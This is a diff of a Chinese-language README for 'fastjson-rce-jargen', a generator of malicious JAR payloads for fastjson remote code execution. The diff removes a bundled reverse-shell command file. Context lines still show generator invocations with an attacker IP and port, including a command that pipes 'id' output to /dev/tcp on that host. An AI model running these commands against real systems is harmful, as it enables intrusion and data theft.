@@ -152,14 +152,14 @@ python genjar.py --prefix XZ --jar evil --ip 172.26.50.158 --port 4444 \
   --cmd "id > /dev/tcp/172.26.50.158/4444" --out-dir ./out
 ```
 
-**③ `--cmd-file`（推荐）** —— 把命令写进文件，脚本会 `.strip()` 后原样使用
+**③ `--cmd-file`（推荐）** —— 把命令写进自己的本地文件，脚本会 `.strip()` 后原样使用（避开 shell 转义）
 
 ```bash
 python genjar.py --prefix XZ --jar evil --ip 172.26.50.158 --port 4444 \
-  --cmd-file examples/shell_cmd.txt --out-dir ./out
+  --cmd-file ./my_cmd.txt --out-dir ./out
 ```
 
-`examples/shell_cmd.txt` 是一个带 CR 剥离的反弹通道示例，用之前记得把 IP / 端口换成自己的。
+命令文件按需自行创建，本仓库不收录：这类文件通常含真实 IP、端口和回连命令，不适合提交进公开仓库（`.gitignore` 已排除常见命名）。
 
 > `--cr` 只对**内置默认命令**生效。用 `--cmd` / `--cmd-file` 时若要 CR 剥离，请自己写进命令里；脚本检测到命令里没有 `c%` 会打印提示。
 
@@ -242,8 +242,6 @@ python genjar.py --prefix XZ --jar evil --ip 172.26.50.158 --port 4444 \
 ```
 fastjson-rce-jargen/
 ├── genjar.py                  # 生成器主程序（原样保留，未改动）
-├── examples/
-│   └── shell_cmd.txt          # 自定义命令示例（带 CR 剥离的反弹通道）
 ├── .gitignore
 └── README.md
 ```
